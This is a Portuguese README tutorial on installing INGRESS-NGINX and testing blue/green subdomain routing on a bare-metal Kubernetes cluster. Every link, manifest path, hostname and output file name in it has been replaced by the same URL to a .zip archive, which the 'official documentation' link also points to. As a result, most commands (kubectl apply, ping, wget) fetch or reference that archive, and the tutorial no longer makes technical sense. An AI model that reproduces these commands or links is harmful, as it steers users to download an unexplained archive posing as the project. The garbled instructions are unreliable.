# Tutorial para instalação, configuração e teste de INGRESS-NGINX

## Pré-requisito

Um cluster kubernetes instalado e configurado

## Como instalar o Ingress

foi utilizado a documetação oficial do [INGRESS-NGINX].  

Como estou utilizando um ambiente Bare-Metal, segue os pre-requisitos gerais e o especifico para bare-metal, onde fez o deploy por nodePort

## Sobre o teste

O teste tem o objetivo de validar o roteamento do ingress entre os deploys de duas aplicações.

## Deploy do teste

Com o [INGRESS-NGINX] funcionando, efetue o deploy das duas aplicações
```
kubectl apply -f https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
kubectl apply -f https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
```
Verifique se os deploys estão funcionando

```
root@kmaster:~/ingres# kubectl get deploy

NAME           READY   UP-TO-DATE   AVAILABLE   AGE
blue-deploy    1/1     1            1           12h
green-deploy   1/1     1            1           12h
```

Efetue o deploy dos serviços

```
kubectl apply -f https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
```

Agora verifique se os serviços estão funcionando

```
root@kmaster:~/ingres# kubectl get services

NAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE
blue-service    ClusterIP   10.104.174.70    <none>        80/TCP    12h
green-service   ClusterIP   10.102.167.166   <none>        80/TCP    12h
kubernetes      ClusterIP   10.96.0.1        <none>        443/TCP   15h
```

Para fazer o deploy do roteamento das aplicações é necessário antes ajustar o <DOMAIN-NAME> no arquivo https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip

Com o ajsute realizado, efetue o deploy das definições do ingress para as aplicações

```
kubectl apply -f https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
```

Verifique se a regra de roteamento do ingres foi configurado corretamenta.

```
root@kmaster:~/ingres# kubectl get ingress

NAME           HOSTS                                    ADDRESS          PORTS   AGE
subdiretorio   <DOMAIN-NAME>                            10.109.179.166   80      11h
subdominio     blue.<DOMAIN-NAME>,green<DOMAIN-NAME>    10.109.179.166   80      129m
```

Com tudo corretamente configurado, vamos realizar o teste final. Para isso precisamos ajustar o apontamento do DNS com o objetivo de encontrar o subdominio que definimos ras regras do [INGRESS-NGINX].

Antes de ajustar o arquivos /etc/hosts, precisamos pegar o IP dos nodes do Kubernetes.

> ```sh
> root@kmaster:~/ingres# kubectl get nodes -o wide
> NAME      STATUS   ROLES    AGE   VERSION    INTERNAL-IP     EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION      CONTAINER-RUNTIME
> kmaster   Ready    master   16h   v1.17.4   192.168.3.200   <none>        Ubuntu 18.04.4 LTS   4.15.0-91-generic   docker://19.3.8
> knode1    Ready    <none>   16h   v1.17.4   192.168.3.201   <none>        Ubuntu 18.04.4 LTS   4.15.0-91-generic   docker://19.3.8
> knode2    Ready    <none>   12h   v1.17.4   192.168.3.202   <none>        Ubuntu 18.04.4 LTS   4.15.0-91-generic   docker://19.3.8
> ```

No meu caso os IP's são: `192.168.3.200` , `192,168.3.201` e `192.168.3.202`

Agora vamos ajustar o arquivo **/etc/hosts** da máquina onde iremos realizar o teste de acesso as aplicações, no meu caso vou utilizar o próprio wget. 

```
sudo vi /etc/hosts
```

Inclua as linhas abaixo em qualquer posição no conteudo do aruqivo. Lembrando que devemos criar uma linha para cada IP dos nodes do kubernetes para cada uma das aplicações.  

>```
><IP MASTER NODE>    blue.<DOMAIN-NAME>      # Master
><IP NODE N>         blue.<DOMAIN-NAME>      # Node N
><IP MASTER NODE>    green.<DOMAIN-NAME>     # Master
><IP NODE N>         green.<DOMAIN-NAME>     # Node N
>```

Salve o arquivo, e teste se os subdominios estão respondendo.

```
abuosi@bancada:~/code/abuosi/ingres$ ping https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
PING https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (192.168.3.200) 56(84) bytes of data.
64 bytes from kmaster (192.168.3.200): icmp_seq=1 ttl=64 time=1.78 ms
64 bytes from kmaster (192.168.3.200): icmp_seq=2 ttl=64 time=0.313 ms
--- https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
>rtt min/avg/max/mdev = 0.313/1.046/1.780/0.733 ms
```

``` 
abuosi@bancada:~/code/abuosi/ingres$ ping https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
PING https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (192.168.3.200) 56(84) bytes of data.
64 bytes from kmaster (192.168.3.200): icmp_seq=1 ttl=64 time=0.387 ms
64 bytes from kmaster (192.168.3.200): icmp_seq=2 ttl=64 time=0.212 ms
```

Agora temos que pegar as portas criadas pelo [INGRESS-NGINX], uma vez que realizamos a configuração por Node Port e não tenho um load-balancer no meu cluster kubernetes.

```sh
root@kmaster:~/ingres# kubectl get services -n ingress-nginx
NAME            TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)                      AGE
ingress-nginx   NodePort   10.109.179.166   <none>        80:32335/TCP,443:32212/TCP   15h
```

No meu caso as Portas são: `HTTP -> 32335` e `HTTPS ->32212`

Com os sub-domínios respondendo dentro da máquina e com o número das portas, chegou o momento mais esperado e verificarmos se o roteamento do [INGRESS-NGINX] esta funcionando corretamente.

> sintaxe:    

> wget -O <Arquivo de Saida Azul> http://blue.`DOMAIN-NAME`:`HTTP PORT NUMBER`

> wget -O <Arquivo de Saida Verde> http://green.`DOMAIN-NAME`:`HTTP PORT NUMBER`


```sh
abuosi@bancada:~/code/abuosi/ingres$ wget -O https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
--2020-04-02 11:38:20--  https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
Resolving https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip)... 192.168.3.200
Connecting to https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip)|192.168.3.200|:32335... connected.
HTTP request sent, awaiting response... 200 OK
Length: 96 [text/html]
Saving to: ‘https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip’

https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip                      100%[====================================================>]      96  --.-KB/s    in 0s

2020-04-02 11:38:20 (12,6 MB/s) - ‘https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip’ saved [96/96]

abuosi@bancada:~/code/abuosi/ingres$ wget -O https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
--2020-04-02 11:43:02--  https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
Resolving https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip)... 192.168.3.200
Connecting to https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip (https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip)|192.168.3.200|:32335... connected.
HTTP request sent, awaiting response... 200 OK
Length: 98 [text/html]
Saving to: ‘https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip’

https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip                     100%[====================================================>]      98  --.-KB/s    in 0s

2020-04-02 11:43:05 (8,67 MB/s) - ‘https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip’ saved [98/98]
```
Como resultado dos comandos acima, serão gerados os arquivos https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip e https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip e seu conteudo deve ser o mostrado abaixo

```sh
abuosi@bancada:~/code/abuosi/ingres$ more https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
<html lang="pt-br">
<body bgcolor="blue">
    <h1 style="color:white">AZUL</h1>
</body>
</html>
abuosi@bancada:~/code/abuosi/ingres$ more https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip
<html lang="pt-br">
<body bgcolor="green">
    <h1 style="color:white">VERDE</h1>
</body>
</html>
abuosi@bancada:~/code/abuosi/ingres$
```
Como podemos ver o roteamento do [INGRESS-NGINX] para as aplicações funcionou corretamente, e trouxe o conteudo de HTML de cada uma das aplicações. 

   [INGRESS-NGINX]: <https://raw.githubusercontent.com/abuosi/ingress-nginx/master/k8s/nginx_ingress_v3.6.zip>
   
